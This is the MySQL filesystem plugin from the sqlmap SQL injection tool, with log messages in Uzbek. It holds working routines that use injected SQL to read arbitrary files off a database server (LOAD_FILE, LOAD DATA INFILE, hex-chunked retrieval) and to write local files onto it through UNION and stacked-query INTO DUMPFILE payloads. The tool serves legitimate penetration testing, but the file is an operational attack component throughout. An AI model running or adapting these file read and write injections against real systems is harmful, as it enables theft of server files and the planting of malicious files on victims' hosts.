#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import getSQLSnippet
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import SqlmapNoneDataException
from lib.request import inject
from lib.request.connect import Connect as Request
from lib.techniques.union.use import unionUse
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def nonStackedReadFile(self, rFile):
        if not kb.bruteMode:
            infoMsg = "fayl olinmoqda: '%s'" % rFile
            logger.info(infoMsg)

        result = inject.getValue("HEX(LOAD_FILE('%s'))" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "fayl olinmoqda: '%s'" % remoteFile
            logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longtext")
        self.getRemoteTempPath()

        tmpFile = "%s/tmpf%s" % (conf.tmpPath, randomStr(lowercase=True))

        debugMsg = "'%s' faylining o'n oltilik mazmuni saqlanmoqda " % remoteFile
        debugMsg += "'%s' vaqtinchalik fayliga" % tmpFile
        logger.debug(debugMsg)
        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (remoteFile, tmpFile))

        debugMsg = "o'n oltilik kodlangan fayl mazmuni yuklanmoqda "
        debugMsg += "'%s', yordamchi jadvalga" % remoteFile
        logger.debug(debugMsg)
        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))

        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        if not isNumPosStrValue(length):
            warnMsg = "mazmunni olib bo'lmadi: "
            warnMsg += "'%s' faylidan" % remoteFile

            if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                if not kb.bruteMode:
                    warnMsg += ', oddiyroq UNION usuliga qaytilmoqda'
                    logger.warning(warnMsg)
                result = self.nonStackedReadFile(remoteFile)
            else:
                raise SqlmapNoneDataException(warnMsg)
        else:
            length = int(length)
            chunkSize = 1024

            if length > chunkSize:
                result = []

                for i in xrange(1, length + 1, chunkSize):
                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, chunkSize, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                    result.append(chunk)
            else:
                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    @stackedmethod
    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        logger.debug("fayl o'n oltilik matnga kodlanmoqda")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = 'inyeksiya GET parametrida va fayl '
            warnMsg += "yoziladigan o'n oltilik qiymat uzunligi %d " % fcEncodedStrLen
            warnMsg += 'bayt; bu faylni yozish '
            warnMsg += "jarayonida xatoga sabab bo'lishi mumkin"
            logger.warning(warnMsg)

        debugMsg = "%s fayli mazmuni '%s' fayliga chiqarilmoqda" % (fileType, remoteFile)
        logger.debug(debugMsg)

        pushValue(kb.forceWhere)
        kb.forceWhere = PAYLOAD.WHERE.NEGATIVE
        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, remoteFile)
        unionUse(sqlQuery, unpack=False)
        kb.forceWhere = popValue()

        warnMsg = "fayl ichida keraksiz belgilar bo'lishi mumkin: "
        warnMsg += "UNION so'rovidan qolgan"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def linesTerminatedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        logger.debug("fayl o'n oltilik matnga kodlanmoqda")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = 'inyeksiya GET parametrida va fayl '
            warnMsg += "yoziladigan o'n oltilik qiymat uzunligi %d " % fcEncodedStrLen
            warnMsg += 'bayt; bu faylni yozish '
            warnMsg += "jarayonida xatoga sabab bo'lishi mumkin"
            logger.warning(warnMsg)

        debugMsg = "%s fayli mazmuni '%s' fayliga chiqarilmoqda" % (fileType, remoteFile)
        logger.debug(debugMsg)

        query = getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=remoteFile, HEXSTRING=fcEncodedStr)
        query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
        payload = agent.payload(newValue=query)
        Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)

        warnMsg = "fayl ichida keraksiz belgilar bo'lishi mumkin: "
        warnMsg += "asl so'rovdan qolgan"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        debugMsg = "o'n oltilik kodlangan faylni yozish uchun "
        debugMsg += 'yordamchi jadval yaratilmoqda'
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")

        logger.debug("fayl o'n oltilik matnga kodlanmoqda")
        fcEncodedList = self.fileEncode(localFile, "hex", False)

        debugMsg = "o'n oltilik faylni yordamchi jadvalga "
        debugMsg += 'yozish uchun SQL buyruqlari tuzilmoqda'
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("o'n oltilik kodlangan fayl yordamchi jadvalga kiritilmoqda")

        inject.goStacked("SET GLOBAL max_allowed_packet = %d" % (1024 * 1024))  # 1MB (Note: https://github.com/sqlmapproject/sqlmap/issues/3230)

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg = "%s fayli mazmuni '%s' fayliga chiqarilmoqda" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, remoteFile), silent=True)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
